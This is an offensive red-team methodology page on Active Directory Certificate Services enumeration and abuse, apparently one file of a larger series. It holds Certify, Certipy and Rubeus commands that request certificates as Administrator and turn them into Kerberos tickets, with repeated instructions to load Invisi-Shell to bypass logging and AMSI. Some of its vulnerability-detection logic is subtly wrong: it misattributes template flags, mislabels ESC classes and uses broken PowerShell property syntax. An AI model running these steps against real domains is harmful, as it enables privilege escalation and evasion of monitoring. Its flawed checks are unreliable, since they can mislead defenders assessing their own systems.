[Prev: 26_Kerberos_Advanced_Attacks.md](./26_Kerberos_Advanced_Attacks.md) | [Up: Index](./00_Enumeration_Index.md) | [Hub](./00_Methodology_Hub.md) | [Next: 28_SQL_Server_Enumeration.md](./28_SQL_Server_Enumeration.md)

# AD CS Enumeration

> **⚠️ CRITICAL TOOL REQUIREMENT**: **Invisi-Shell** is mandatory for production environments to ensure stealth operations and avoid detection. See [Tool Arsenal](./01_Tool_Setup_Loading.md#-invisi-shell-complete-setup) for setup instructions.

## Overview
**AD CS Enumeration** is a critical red team technique for discovering and analyzing **Active Directory Certificate Services (AD CS)** within an Active Directory environment.

### **What is AD CS?**
**AD CS (Active Directory Certificate Services)** is Microsoft's Public Key Infrastructure (PKI) solution that provides:
- **Digital Certificates**: For users, computers, and services
- **Certificate Authorities (CAs)**: Servers that issue and manage certificates
- **Certificate Templates**: Predefined certificate configurations
- **Enrollment Services**: Web-based certificate request systems

### **Why AD CS Matters for Red Teams**
AD CS can be abused for:
- **Privilege Escalation**: Using certificates to impersonate high-privilege users
- **Lateral Movement**: Using certificates for authentication across systems
- **Persistence**: Long-term access through certificate-based authentication
- **Bypass**: Circumventing traditional authentication mechanisms

### **Key AD CS Components**
- **Root CA**: The top-level certificate authority
- **Subordinate CA**: Intermediate certificate authorities
- **Certificate Templates**: Predefined certificate configurations
- **Enrollment Agents**: Services that request certificates on behalf of users
- **Certificate Revocation Lists (CRL)**: Lists of revoked certificates

## What AD CS Enumeration Achieves
## 📋 **QUICK START AD CS DISCOVERY**

| Phase | Tool | Command | Purpose | OPSEC |
|------|------|---------|---------|------|
| 1 | certutil | `certutil -ca` | CA presence | 🟢 |
| 2 | AD Module | `Get-ADObject -Filter {objectClass -eq "pKICertificateTemplate"} -ResultSetSize 25` | Template sample | 🟢 |
| 3 | PowerView | `Get-DomainObject -LDAPFilter "(objectClass=pKIEnrollmentService)"` | Enrollment svc | 🟡 |
| 4 | Certify | `Certify.exe find /vulnerable` | Template weaknesses | 🟠 |
| 5 | Certipy | `certipy find -u user@dom -p pass -vulnerable` | Cross-check vulns | 🟠 |

## 🎭 **AT-A-GLANCE: AD CS ESSENTIALS**

**Reveals:** CAs, templates, enrollment paths, vulnerable flags (ESC1–ESC8), client‑auth EKUs.

**Use Cases:** PKINIT to TGT, impersonation via SAN/UPN, Enrollment Agent abuse, relay to AD CS.

**Speed:** Stealth 3–6s jitter; Balanced 1–2s; Lab unrestricted.

## 🧭 **PIVOT MATRIX: STRATEGIC NEXT STEPS**

| Finding | Immediate Pivot | Goal | Tool/Technique |
|---------|-----------------|------|----------------|
| EnrolleeSuppliesSubject | ESC1/ESC2 abuse | Impersonation via SAN/subject | Certify, Certipy |
| ClientAuth EKU template | PKINIT | TGT for target principal | Rubeus, Certipy |
| Enrollment Agent EKU | ESC6 OBO | On‑behalf‑of cert for admin | Certify EA |
| HTTP enrollment enabled | NTLM relay | Cert issuance via relay | ntlmrelayx → AD CS |

---

## 🛠️ **COMPREHENSIVE ENUMERATION TOOLS**

### 🔧 Microsoft‑Signed & Native
- `certutil -ca`, `-template`, `-service`, `-store` — Baseline CA/templates/services/stores
- `Get-ADObject -Filter {objectClass -eq "pKICertificateTemplate"} -Properties * -ResultSetSize 50` — Template sample
- `Get-ADObject -Filter {objectClass -eq "pKIEnrollmentService"} -Properties *` — Enrollment services

### ⚔️ Offensive (PowerView/SharpView)
```powershell
Get-DomainObject -LDAPFilter "(objectClass=pKICertificateAuthority)" -Properties *
Get-DomainObject -LDAPFilter "(objectClass=pKICertificateTemplate)" -Properties *
Get-DomainObject -LDAPFilter "(objectClass=pKIEnrollmentService)" -Properties *
# Quick vuln filters
Get-DomainObject -LDAPFilter "(objectClass=pKICertificateTemplate)" -Properties * | Where-Object {
  $_.'msPKI-Enrollment-Flag' -band 0x2 -or $_.'msPKI-Private-Key-Flag' -band 0x1 }
```

### 🔴 Red Team (AD CS)
```cmd
Certify.exe cas | findstr /i CA                                                   :: CA overview
Certify.exe find /vulnerable                                                      :: Common ESCs
Certify.exe request /ca:CA01 /template:User /subject:CN=Administrator /export     :: Subject/SAN abuse
certipy find -u user@corp.local -p Passw0rd! -vulnerable                          :: Python cross‑check
certipy req -u user@corp.local -p Passw0rd! -template User -upn administrator@corp.local -out admin :: Request
Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /outfile:admin.kirbi :: PKINIT
```

> **🔒 STEALTH REQUIREMENT**: **Invisi-Shell** must be loaded before any AD CS enumeration in production environments to bypass logging and AMSI detection.

---

## 🎯 **COMPREHENSIVE AD CS COMMAND REFERENCE (20+ Commands)**

### **1. Native Windows AD CS Commands (certutil)**

#### **CA Discovery & Configuration**
```cmd
# Basic CA enumeration
certutil -ca                                    # List all certificate authorities
certutil -ca -v                                # Verbose CA information
certutil -ca -f                                # Force refresh CA cache
certutil -ca -restrict                         # Show CA restrictions

# CA configuration details
certutil -getreg CA\CRLPeriod                  # Get CRL publication period
certutil -getreg CA\CRLDeltaPeriod            # Get CRL delta period
certutil -getreg CA\ValidityPeriod            # Get certificate validity period
certutil -getreg CA\ValidityPeriodUnits       # Get validity period units
```

**Command Explanations:**
- **`certutil -ca`**: Lists all CAs in the domain, essential for AD CS discovery
- **`certutil -ca -v`**: Provides detailed CA information including flags and configurations
- **`certutil -ca -f`**: Forces refresh of CA cache, useful after configuration changes
- **`certutil -ca -restrict`**: Shows CA restrictions and enrollment policies

#### **Certificate Template Enumeration**
```cmd
# Template discovery
certutil -template                             # List all certificate templates
certutil -template -v                          # Verbose template information
certutil -template -f                          # Force template refresh
certutil -template -restrict                   # Show template restrictions

# Template security analysis
certutil -template -v | findstr "Enrollee"     # Find templates with enrollee flags
certutil -template -v | findstr "Exportable"  # Find templates with exportable keys
certutil -template -v | findstr "ClientAuth"  # Find templates with client auth EKU
```

**Command Explanations:**
- **`certutil -template`**: Lists all available certificate templates in the domain
- **`certutil -template -v`**: Shows detailed template properties including security flags
- **`certutil -template -f`**: Forces refresh of template cache
- **`certutil -template -restrict`**: Displays template enrollment restrictions

#### **Certificate Store Analysis**
```cmd
# Store enumeration
certutil -store                                # List all certificate stores
certutil -store -v                            # Verbose store information
certutil -store "My"                          # List personal certificates
certutil -store "CA"                          # List CA certificates
certutil -store "Root"                        # List root certificates
certutil -store "TrustedPeople"               # List trusted people certificates

# Certificate details
certutil -store -v "My" | findstr "Subject"   # Extract subject names
certutil -store -v "My" | findstr "NotAfter"  # Extract expiration dates
certutil -store -v "My" | findstr "Template"  # Extract template information
```

**Command Explanations:**
- **`certutil -store`**: Lists all certificate stores on the system
- **`certutil -store -v`**: Provides detailed certificate information
- **`certutil -store "My"`**: Shows personal certificates (most relevant for user enumeration)
- **`certutil -store "CA"`**: Shows CA certificates for infrastructure mapping

### **2. PowerShell AD CS Commands (Microsoft AD Module)**

#### **AD CS Object Discovery**
```powershell
# Import AD module
Import-Module ActiveDirectory

# CA enumeration
Get-ADObject -Filter {objectClass -eq "pKICertificateAuthority"} -Properties *
Get-ADObject -Filter {objectClass -eq "pKICertificateAuthority"} -Properties name,dNSHostName,servicePrincipalName,flags,certificateTemplates

# Template enumeration
Get-ADObject -Filter {objectClass -eq "pKICertificateTemplate"} -Properties *
Get-ADObject -Filter {objectClass -eq "pKICertificateTemplate"} -Properties displayName,name,msPKI-Schema-Version,msPKI-Template-OID

# Enrollment service discovery
Get-ADObject -Filter {objectClass -eq "pKIEnrollmentService"} -Properties *
Get-ADObject -Filter {objectClass -eq "pKIEnrollmentService"} -Properties name,dNSHostName,servicePrincipalName,flags
```

**Command Explanations:**
- **`Get-ADObject -Filter {objectClass -eq "pKICertificateAuthority"}`**: Discovers all CA objects in AD
- **`Get-ADObject -Filter {objectClass -eq "pKICertificateTemplate"}`**: Lists all certificate templates
- **`Get-ADObject -Filter {objectClass -eq "pKIEnrollmentService"}`**: Finds enrollment services

#### **Template Security Analysis**
```powershell
# Find vulnerable templates
Get-ADObject -Filter {objectClass -eq "pKICertificateTemplate"} -Properties * | Where-Object {
    $_.'msPKI-Enrollment-Flag' -band 0x00000002 -or  # Enrollee Supplies Subject
    $_.'msPKI-Enrollment-Flag' -band 0x00000004 -or  # Enrollee Supplies Subject Alt Name
    $_.'msPKI-Private-Key-Flag' -band 0x00000001      # Exportable Private Key
}

# Template permission analysis
Get-ADObject -Filter {objectClass -eq "pKICertificateTemplate"} -Properties nTSecurityDescriptor,displayName | 
    ForEach-Object {
        $template = $_
        $acl = $template.nTSecurityDescriptor
        Write-Host "Template: $($template.displayName)"
        Write-Host "  Enrollment Permissions: $($acl.Access)"
    }
```

**Command Explanations:**
- **Template vulnerability flags**: Analyzes enrollment and private key flags for security weaknesses
- **Permission analysis**: Examines template ACLs for enrollment rights and potential abuse

### **3. PowerView/SharpView AD CS Commands**

#### **Comprehensive AD CS Enumeration**
```powershell
# CA discovery with PowerView
Get-DomainObject -LDAPFilter "(objectClass=pKICertificateAuthority)" -Properties *
Get-DomainObject -LDAPFilter "(objectClass=pKICertificateAuthority)" -Properties name,dNSHostName,servicePrincipalName,flags,certificateTemplates

# Template enumeration with PowerView
Get-DomainObject -LDAPFilter "(objectClass=pKICertificateTemplate)" -Properties *
Get-DomainObject -LDAPFilter "(objectClass=pKICertificateTemplate)" -Properties displayName,name,msPKI-Schema-Version,msPKI-Template-OID

# Enrollment service discovery with PowerView
Get-DomainObject -LDAPFilter "(objectClass=pKIEnrollmentService)" -Properties *
Get-DomainObject -LDAPFilter "(objectClass=pKIEnrollmentService)" -Properties name,dNSHostName,servicePrincipalName,flags
```

**Command Explanations:**
- **PowerView integration**: Uses PowerView's LDAP filtering for comprehensive AD CS discovery
- **Property enumeration**: Retrieves all relevant properties for analysis

#### **Vulnerability Assessment**
```powershell
# Find vulnerable templates for ESC1/ESC2
Get-DomainObject -LDAPFilter "(objectClass=pKICertificateTemplate)" -Properties * | Where-Object {
    $_.'msPKI-Enrollment-Flag' -band 0x00000002  # Enrollee Supplies Subject
}

# Find templates with exportable private keys
Get-DomainObject -LDAPFilter "(objectClass=pKICertificateTemplate)" -Properties * | Where-Object {
    $_.'msPKI-Private-Key-Flag' -band 0x00000001  # Exportable Private Key
}

# Find templates with client authentication EKU
Get-DomainObject -LDAPFilter "(objectClass=pKICertificateTemplate)" -Properties * | Where-Object {
    $_.'msPKI-Extended-Key-Usage' -like "*Client Authentication*"
}
```

**Command Explanations:**
- **ESC1/ESC2 detection**: Identifies templates where users can supply subject names
- **Private key analysis**: Finds templates with exportable private keys
- **EKU analysis**: Identifies templates suitable for client authentication

### **4. Red Team AD CS Tools (Certify/Certipy)**

#### **Certify.exe Commands**
```cmd
# Basic enumeration
Certify.exe cas                                # List all certificate authorities
Certify.exe cas /enrolleeSuppliesSubject       # Find templates with subject control
Certify.exe cas /clientAuth                    # Find templates with client auth EKU

# Template discovery
Certify.exe find /enrolleeSuppliesSubject      # Find ESC1/ESC2 vulnerable templates
Certify.exe find /clientAuth                   # Find client authentication templates
Certify.exe find /enrollmentAgent              # Find enrollment agent templates
Certify.exe find /vulnerable                   # Find all vulnerable templates

# Certificate requests
Certify.exe request /ca:CA01.cybercorp.local /template:User /subject:CN=Administrator
Certify.exe request /ca:CA01.cybercorp.local /template:User /altname:administrator@cybercorp.local
Certify.exe request /ca:CA01.cybercorp.local /template:User /export
```

**Command Explanations:**
- **`Certify.exe cas`**: Lists all CAs in the domain
- **`Certify.exe find /enrolleeSuppliesSubject`**: Discovers templates vulnerable to ESC1/ESC2
- **`Certify.exe request`**: Requests certificates with custom subjects or SANs

#### **Certipy Commands**
```bash
# Template enumeration
certipy find -u 'user@cybercorp.local' -p 'Password123!' -dc-ip 10.0.0.10
certipy find -u 'user@cybercorp.local' -p 'Password123!' -dc-ip 10.0.0.10 -vulnerable

# Certificate requests
certipy req -u 'user@cybercorp.local' -p 'Password123!' -target 'ca01.cybercorp.local' -template 'User'
certipy req -u 'user@cybercorp.local' -p 'Password123!' -target 'ca01.cybercorp.local' -template 'User' -upn 'administrator@cybercorp.local'

# Certificate authentication
certipy auth -pfx admin.pfx -dc-ip 10.0.0.10 -username 'Administrator' -domain 'cybercorp.local' -no-pass
```

**Command Explanations:**
- **`certipy find`**: Enumerates templates and identifies vulnerabilities
- **`certipy req`**: Requests certificates from vulnerable templates
- **`certipy auth`**: Uses certificates for PKINIT authentication

### **5. Advanced AD CS Analysis Commands**

#### **Template Security Deep Dive**
```powershell
# Comprehensive template analysis
Get-DomainObject -LDAPFilter "(objectClass=pKICertificateTemplate)" -Properties * | ForEach-Object {
    $template = $_
    $enrollmentFlags = $template.'msPKI-Enrollment-Flag'
    $subjectFlags = $template.'msPKI-Subject-Name-Flag'
    $privateKeyFlags = $template.'msPKI-Private-Key-Flag'
    
    Write-Host "Template: $($template.displayName)" -ForegroundColor Cyan
    Write-Host "  Enrollment Flags: $enrollmentFlags"
    Write-Host "  Subject Flags: $subjectFlags"
    Write-Host "  Private Key Flags: $privateKeyFlags"
    
    # Check for specific vulnerabilities
    if ($enrollmentFlags -band 0x00000002) {
        Write-Host "    ⚠️  ESC1/ESC2: Enrollee Supplies Subject" -ForegroundColor Red
    }
    if ($privateKeyFlags -band 0x00000001) {
        Write-Host "    ⚠️  Exportable Private Key" -ForegroundColor Red
    }
}
```

**Command Explanations:**
- **Comprehensive analysis**: Examines all template flags for security weaknesses
- **Vulnerability mapping**: Maps specific flags to ESC vulnerabilities
- **Risk assessment**: Provides clear vulnerability identification

#### **CA Configuration Analysis**
```powershell
# CA configuration deep dive
Get-DomainObject -LDAPFilter "(objectClass=pKICertificateAuthority)" -Properties * | ForEach-Object {
    $ca = $_
    $flags = $ca.flags
    
    Write-Host "CA: $($ca.name)" -ForegroundColor Green
    Write-Host "  DNS Host Name: $($ca.DNSHostName)"
    Write-Host "  Flags: $flags"
    Write-Host "  Is Enterprise CA: $(if ($flags -band 0x00000001) {'Yes'} else {'No'})"
    Write-Host "  Is Standalone CA: $(if ($flags -band 0x00000002) {'Yes'} else {'No'})"
    Write-Host "  Certificate Templates: $($ca.certificateTemplates.Count)"
    
    # Analyze CA security
    if ($ca.certificateTemplates.Count -gt 10) {
        Write-Host "    ⚠️  High template count - potential security risk" -ForegroundColor Yellow
    }
}
```

**Command Explanations:**
- **CA security analysis**: Examines CA configuration for security implications
- **Flag interpretation**: Decodes CA flags for understanding
- **Risk assessment**: Identifies potential security concerns

---

## 🛠️ AD CS Enumeration Tools

### **1. Native Windows AD CS Tools**

#### **certutil.exe** - Certificate Utility
```cmd
# Basic CA enumeration
certutil -ca

# List certificate templates
certutil -template

# List certificate services
certutil -service

# View certificate store
certutil -store

# View certificate details
certutil -dump

# List certificate revocation lists
certutil -crl

# Advanced certificate queries
certutil -v -ca
certutil -v -template
certutil -v -service

# Export certificate information
certutil -ca > ca_info.txt
certutil -template > templates.txt
certutil -service > services.txt

# Check specific certificate
certutil -store -v "My"
certutil -store -v "CA"
certutil -store -v "Root"
```

**Tool Explanation:**
- **certutil.exe**: Built-in Windows certificate management tool
- **-ca**: List certificate authorities in the domain
- **-template**: List available certificate templates
- **-service**: List certificate services
- **-store**: View certificate store contents
- **-dump**: Display detailed certificate information
- **-crl**: List certificate revocation lists
- **Advantages**: Built into Windows, comprehensive certificate functions
- **Disadvantages**: May be logged, limited output formatting

#### **mmc.exe** - Microsoft Management Console
```cmd
# Open MMC with certificate snap-in
mmc certmgr.msc

# Open MMC with certificate authority snap-in
mmc certsrv.msc
```

**Tool Explanation:**
- **mmc.exe**: Built-in Windows management console
- **certmgr.msc**: Certificate manager snap-in
- **certsrv.msc**: Certificate services snap-in
- **Advantages**: Built into Windows, graphical interface
- **Disadvantages**: Requires GUI, may be logged

### 2. PowerShell AD CS Tools

#### **PowerView - AD CS Enumeration Functions**
```powershell
# Basic AD CS discovery
Get-DomainComputer -SPN | Where-Object {$_.servicePrincipalName -like "*CA*"}
Get-DomainComputer -SPN | Where-Object {$_.servicePrincipalName -like "*CertSrv*"}

# Enumerate AD CS related objects
Get-DomainObject -LDAPFilter "(objectClass=pKIEnrollmentService)" -Properties *
Get-DomainObject -LDAPFilter "(objectClass=pKICertificateAuthority)" -Properties *

# Get AD CS configuration details
Get-DomainObject -LDAPFilter "(objectClass=pKICertificateAuthority)" -Properties name,dNSHostName,servicePrincipalName,flags,certificateTemplates

# Find AD CS enrollment services
Get-DomainObject -LDAPFilter "(objectClass=pKIEnrollmentService)" -Properties name,dNSHostName,servicePrincipalName,flags

# Search for certificate templates
Get-DomainObject -LDAPFilter "(objectClass=pKICertificateTemplate)" -Properties displayName,name,msPKI-Schema-Version,msPKI-Template-OID

# Find vulnerable certificate templates
Get-DomainObject -LDAPFilter "(objectClass=pKICertificateTemplate)" -Properties * | Where-Object {
    $_.'msPKI-Enrollment-Flag' -band 0x00000002 -or  # Enrollee Supplies Subject
    $_.'msPKI-Enrollment-Flag' -band 0x00000004 -or  # Enrollee Supplies Subject Alt Name
    $_.'msPKI-Private-Key-Flag' -band 0x00000001      # Exportable Private Key
}

# Export AD CS data for analysis
Get-DomainObject -LDAPFilter "(objectClass=pKICertificateAuthority)" -Properties * | 
    Export-Csv -Path "adcs_cas.csv" -NoTypeInformation

Get-DomainObject -LDAPFilter "(objectClass=pKICertificateTemplate)" -Properties * | 
    Export-Csv -Path "adcs_templates.csv" -NoTypeInformation
```

**Tool Explanation:**
- **Get-DomainComputer -SPN**: PowerView function to enumerate computers with SPNs
- **Get-DomainObject**: PowerView function to query AD objects
- **LDAPFilter**: Filter for AD CS specific objects
- **pKIEnrollmentService**: AD CS enrollment service objects
- **pKICertificateAuthority**: AD CS certificate authority objects
- **Advantages**: PowerView integration, comprehensive AD CS data
- **Disadvantages**: Requires PowerView, may trigger logging

## 🔍 Certificate Template Analysis

```mermaid
mindmap
  root((Certificate Templates))
    🔐 Security Settings
      Enrollment Flags
        Enrollee Supplies Subject
        Subject Alt Name Required
        Exportable Private Key
      Access Control
        Enrollment Permissions
        Read Permissions
        Write Permissions
    📋 Template Types
      User Templates
        SmartcardLogon
        User
        UserSignature
      Computer Templates
        DomainController
        Workstation
        Machine
      Service Templates
        WebServer
        AuthenticatedSession
        RASAndIAS
    ⚠️ Vulnerabilities
      Weak Configurations
        Overly Permissive
        Misconfigured Flags
        Weak Access Control
      Attack Vectors
        Template Abuse
        Enrollment Abuse
        Certificate Theft
```



#### **Active Directory Module - AD CS Queries**
```powershell
# Import Active Directory module
Import-Module ActiveDirectory

# Get AD CS computers
Get-ADComputer -Filter {servicePrincipalName -like "*CA*"} -Properties servicePrincipalName

# Get AD CS objects
Get-ADObject -Filter {objectClass -eq "pKIEnrollmentService"} -Properties *

# Get certificate templates
Get-ADObject -Filter {objectClass -eq "pKICertificateTemplate"} -Properties *
```

**Tool Explanation:**
- **Get-ADComputer**: Native PowerShell AD computer query cmdlet
- **Get-ADObject**: Native PowerShell AD object query cmdlet
- **-Filter**: LDAP filter for AD CS queries
- **-Properties**: Retrieve all properties
- **Advantages**: Native PowerShell, Microsoft supported, LDAP filter support
- **Disadvantages**: Requires AD module, may be logged

### 3. Third-Party AD CS Tools

#### **Certify - AD CS Enumeration Tool**
```powershell
# Certify AD CS enumeration
.\Certify.exe cas

# List certificate authorities
.\Certify.exe cas /enrolleeSuppliesSubject

# Find vulnerable certificate templates
.\Certify.exe find /enrolleeSuppliesSubject

# Request certificate
.\Certify.exe request /ca:CA01.cybercorp.local /template:User
```

**Tool Explanation:**
- **Certify**: Dedicated AD CS enumeration and abuse tool
- **cas**: List certificate authorities
- **find**: Find certificate templates
- **request**: Request certificates
- **/enrolleeSuppliesSubject**: Find templates where users can supply subject
- **Advantages**: Dedicated AD CS tool, comprehensive functionality
- **Disadvantages**: External tool, highly detectable

#### **PowerSploit - AD CS Enumeration**
```powershell
# PowerSploit AD CS enumeration
Import-Module PowerSploit

# AD CS enumeration functions
Get-DomainComputer -SPN | Where-Object {$_.servicePrincipalName -like "*CA*"}
```

**Tool Explanation:**
- **PowerSploit**: Offensive PowerShell framework
- **AD CS Functions**: Dedicated AD CS enumeration functions
- **SPN Analysis**: Analyze SPNs for AD CS services
- **Advantages**: Offensive framework, comprehensive AD CS functions
- **Disadvantages**: Requires PowerSploit, highly detectable

### 4. Custom AD CS Enumeration Scripts

#### **Comprehensive AD CS Enumeration Script**
```powershell
# Comprehensive AD CS enumeration
function Invoke-ComprehensiveADCSEnumeration {
    param([string]$Domain = "cybercorp.local")
    
    try {
        Write-Host "Comprehensive AD CS Enumeration for $Domain" -ForegroundColor Green
        Write-Host "=" * 60
        
        $adcsResults = @{
            Domain = $Domain
            CertificateAuthorities = @()
            CertificateTemplates = @()
            EnrollmentServices = @()
            VulnerableTemplates = @()
            AttackVectors = @()
        }
        
        # Enumerate certificate authorities
        Write-Host "Enumerating certificate authorities..." -ForegroundColor Yellow
        try {
            $cas = Get-DomainObject -LDAPFilter "(objectClass=pKICertificateAuthority)" -Properties *
            
            foreach ($ca in $cas) {
                $caInfo = @{
                    Name = $ca.Name
                    DistinguishedName = $ca.DistinguishedName
                    DNSHostName = $ca.DNSHostName
                    ServicePrincipalName = $ca.servicePrincipalName
                    CertificateTemplates = $ca.certificateTemplates
                    Flags = $ca.flags
                    IsEnterpriseCA = $ca.flags -band 0x00000001
                    IsStandaloneCA = $ca.flags -band 0x00000002
                }
                
                $adcsResults.CertificateAuthorities += $caInfo
                
                Write-Host "  CA: $($ca.Name)" -ForegroundColor Cyan
                Write-Host "    DNS Host Name: $($ca.DNSHostName)"
                Write-Host "    Is Enterprise CA: $($caInfo.IsEnterpriseCA)"
                Write-Host "    Is Standalone CA: $($caInfo.IsStandaloneCA)"
                Write-Host "    Certificate Templates: $($ca.certificateTemplates.Count)"
            }
        }
        catch {
            Write-Host "  Failed to enumerate certificate authorities: $($_.Exception.Message)" -ForegroundColor Red
        }
        
        # Enumerate certificate templates
        Write-Host "`nEnumerating certificate templates..." -ForegroundColor Yellow
        try {
            $templates = Get-DomainObject -LDAPFilter "(objectClass=pKICertificateTemplate)" -Properties *
            
            foreach ($template in $templates) {
                $templateInfo = @{
                    Name = $template.Name
                    DisplayName = $template.displayName
                    DistinguishedName = $template.DistinguishedName
                    SchemaVersion = $template.msPKI-Schema-Version
                    TemplateOID = $template.msPKI-Template-OID
                    EnrollmentFlags = $template.msPKI-Enrollment-Flag
                    SubjectNameFlags = $template.msPKI-Subject-Name-Flag
                    PrivateKeyFlags = $template.msPKI-Private-Key-Flag
                    ExtendedKeyUsage = $template.msPKI-Extended-Key-Usage
                    ApplicationPolicies = $template.msPKI-Application-Policy
                    EnrollmentPermissions = $template.nTSecurityDescriptor
                    IsVulnerable = $false
                    VulnerabilityReason = ""
                }
                
                # Analyze template for vulnerabilities
                if ($template.'msPKI-Enrollment-Flag' -band 0x00000002) {
                    $templateInfo.IsVulnerable = $true
                    $templateInfo.VulnerabilityReason = "Enrollee Supplies Subject"
                }
                
                if ($template.'msPKI-Enrollment-Flag' -band 0x00000004) {
                    $templateInfo.IsVulnerable = $true
                    $templateInfo.VulnerabilityReason += "; Enrollee Supplies Subject Alt Name"
                }
                
                if ($template.'msPKI-Enrollment-Flag' -band 0x00000008) {
                    $templateInfo.IsVulnerable = $true
                    $templateInfo.VulnerabilityReason += "; Subject Alt Name Required"
                }
                
                if ($template.'msPKI-Private-Key-Flag' -band 0x00000001) {
                    $templateInfo.IsVulnerable = $true
                    $templateInfo.VulnerabilityReason += "; Exportable Private Key"
                }
                
                if ($templateInfo.IsVulnerable) {
                    $adcsResults.VulnerableTemplates += $templateInfo
                }
                
                $adcsResults.CertificateTemplates += $templateInfo
                
                Write-Host "  Template: $($template.displayName)" -ForegroundColor Cyan
                Write-Host "    Name: $($template.Name)"
                Write-Host "    Schema Version: $($template.msPKI-Schema-Version)"
                Write-Host "    Is Vulnerable: $($templateInfo.IsVulnerable)"
                if ($templateInfo.IsVulnerable) {
                    Write-Host "    Vulnerability: $($templateInfo.VulnerabilityReason)" -ForegroundColor Red
                }
            }
        }
        catch {
            Write-Host "  Failed to enumerate certificate templates: $($_.Exception.Message)" -ForegroundColor Red
        }
        
        # Enumerate enrollment services
        Write-Host "`nEnumerating enrollment services..." -ForegroundColor Yellow
        try {
            $enrollmentServices = Get-DomainObject -LDAPFilter "(objectClass=pKIEnrollmentService)" -Properties *
            
            foreach ($service in $enrollmentServices) {
                $serviceInfo = @{
                    Name = $service.Name
                    DistinguishedName = $service.DistinguishedName
                    DNSHostName = $service.DNSHostName
                    ServicePrincipalName = $service.servicePrincipalName
                    Flags = $service.flags
                    IsEnterpriseCA = $service.flags -band 0x00000001
                    IsStandaloneCA = $service.flags -band 0x00000002
                }
                
                $adcsResults.EnrollmentServices += $serviceInfo
                
                Write-Host "  Enrollment Service: $($service.Name)" -ForegroundColor Cyan
                Write-Host "    DNS Host Name: $($service.DNSHostName)"
                Write-Host "    Is Enterprise CA: $($serviceInfo.IsEnterpriseCA)"
                Write-Host "    Is Standalone CA: $($serviceInfo.IsStandaloneCA)"
            }
        }
        catch {
            Write-Host "  Failed to enumerate enrollment services: $($_.Exception.Message)" -ForegroundColor Red
        }
        
        # Analyze attack vectors
        Write-Host "`nAnalyzing attack vectors..." -ForegroundColor Yellow
        try {
            foreach ($template in $adcsResults.VulnerableTemplates) {
                $attackVector = @{
                    Template = $template.Name
                    Vulnerability = $template.VulnerabilityReason
                    AttackType = ""
                    Difficulty = ""
                    Impact = ""
                }
                
                if ($template.VulnerabilityReason -like "*Enrollee Supplies Subject*") {
                    $attackVector.AttackType = "Subject Alternative Name (SAN) Abuse"
                    $attackVector.Difficulty = "Medium"
                    $attackVector.Impact = "High - Domain Privilege Escalation"
                }
                
                if ($template.VulnerabilityReason -like "*Exportable Private Key*") {
                    $attackVector.AttackType = "Private Key Extraction"
                    $attackVector.Difficulty = "Low"
                    $attackVector.Impact = "Medium - Credential Theft"
                }
                
                $adcsResults.AttackVectors += $attackVector
                
                Write-Host "  Attack Vector: $($template.Name)" -ForegroundColor Red
                Write-Host "    Vulnerability: $($template.VulnerabilityReason)"
                Write-Host "    Attack Type: $($attackVector.AttackType)"
                Write-Host "    Difficulty: $($attackVector.Difficulty)"
                Write-Host "    Impact: $($attackVector.Impact)"
            }
        }
        catch {
            Write-Host "  Failed to analyze attack vectors: $($_.Exception.Message)" -ForegroundColor Red
        }
        
        # Display summary
        Write-Host "`nAD CS Enumeration Summary:" -ForegroundColor Green
        Write-Host "  Certificate Authorities: $($adcsResults.CertificateAuthorities.Count)"
        Write-Host "  Certificate Templates: $($adcsResults.CertificateTemplates.Count)"
        Write-Host "  Enrollment Services: $($adcsResults.EnrollmentServices.Count)"
        Write-Host "  Vulnerable Templates: $($adcsResults.VulnerableTemplates.Count)"
        Write-Host "  Attack Vectors: $($adcsResults.AttackVectors.Count)"
        
        if ($adcsResults.VulnerableTemplates.Count -gt 0) {
            Write-Host "`n🔴 VULNERABLE TEMPLATES FOUND:" -ForegroundColor Red
            foreach ($template in $adcsResults.VulnerableTemplates) {
                Write-Host "  $($template.DisplayName) - $($template.VulnerabilityReason)"
            }
        }
        
        Write-Host "`nAD CS Enumeration Complete!" -ForegroundColor Green
        return $adcsResults
        
    }
    catch {
        Write-Warning "Comprehensive AD CS enumeration failed: $($_.Exception.Message)"
        return $null
    }
}

# Execute comprehensive AD CS enumeration
$adcsResults = Invoke-ComprehensiveADCSEnumeration -Domain "cybercorp.local"
```

**Tool Explanation:**
- **Custom Function**: Tailored AD CS enumeration for comprehensive analysis
- **Multiple Object Types**: Cover CAs, templates, and enrollment services
- **Vulnerability Analysis**: Analyze templates for security weaknesses
- **Attack Vector Mapping**: Map discovered vulnerabilities to attack vectors
- **Advantages**: Comprehensive coverage, vulnerability analysis, attack planning
- **Disadvantages**: Custom code, may be complex

## AD CS Analysis Techniques

### 1. Certificate Template Analysis

#### **Template Security Assessment**
```powershell
# Assess certificate template security
function Assess-CertificateTemplateSecurity {
    param([hashtable]$ADCSResults)
    
    try {
        Write-Host "Assessing certificate template security..." -ForegroundColor Yellow
        Write-Host "=" * 50
        
        $securityAssessment = @{
            CriticalVulnerabilities = @()
            HighVulnerabilities = @()
            MediumVulnerabilities = @()
            LowVulnerabilities = @()
            SecurityRecommendations = @()
        }
        
        # Analyze each template
        foreach ($template in $ADCSResults.CertificateTemplates) {
            $vulnerabilities = @()
            $riskLevel = "Low"
            
            # Check for critical vulnerabilities
            if ($template.'msPKI-Enrollment-Flag' -band 0x00000002) {
                $vulnerabilities += "Enrollee can supply subject name"
                $riskLevel = "Critical"
            }
            
            if ($template.'msPKI-Enrollment-Flag' -band 0x00000004) {
                $vulnerabilities += "Enrollee can supply subject alt name"
                $riskLevel = "Critical"
            }
            
            if ($template.'msPKI-Private-Key-Flag' -band 0x00000001) {
                $vulnerabilities += "Private key is exportable"
                $riskLevel = "High"
            }
            
            if ($template.'msPKI-Enrollment-Flag' -band 0x00000008) {
                $vulnerabilities += "Subject alt name is required"
                $riskLevel = "Medium"
            }
            
            # Categorize vulnerabilities
            switch ($riskLevel) {
                "Critical" { $securityAssessment.CriticalVulnerabilities += @{ Template = $template.Name; Vulnerabilities = $vulnerabilities } }
                "High" { $securityAssessment.HighVulnerabilities += @{ Template = $template.Name; Vulnerabilities = $vulnerabilities } }
                "Medium" { $securityAssessment.MediumVulnerabilities += @{ Template = $template.Name; Vulnerabilities = $vulnerabilities } }
                "Low" { $securityAssessment.LowVulnerabilities += @{ Template = $template.Name; Vulnerabilities = $vulnerabilities } }
            }
            
            # Generate security recommendations
            if ($vulnerabilities.Count -gt 0) {
                $securityAssessment.SecurityRecommendations += "Review and secure template: $($template.DisplayName)"
                $securityAssessment.SecurityRecommendations += "  - Vulnerabilities: $($vulnerabilities -join ', ')"
